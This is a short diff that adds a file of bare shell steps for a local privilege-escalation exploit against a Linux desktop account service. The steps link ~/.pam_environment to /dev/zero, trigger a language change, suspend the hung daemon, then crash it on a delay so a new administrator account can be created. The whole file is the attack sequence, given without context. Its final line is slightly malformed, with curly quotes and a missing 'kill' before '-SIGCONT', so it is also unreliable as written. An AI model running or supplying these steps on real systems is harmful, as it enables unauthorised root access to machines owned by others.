@@ -1,0 +1,7 @@
+$ id
+$ ln   -s   /dev/zero   .pam_environment
+(open settings and change the language environment)
+$ top
+$ kill -SIGSTOP [pid]
+$ rm ~/.pam_environment
+$ nohup bash -c “sleep 15s; kill -SIGSEGV [pid]; -SIGCONT [pid]” &
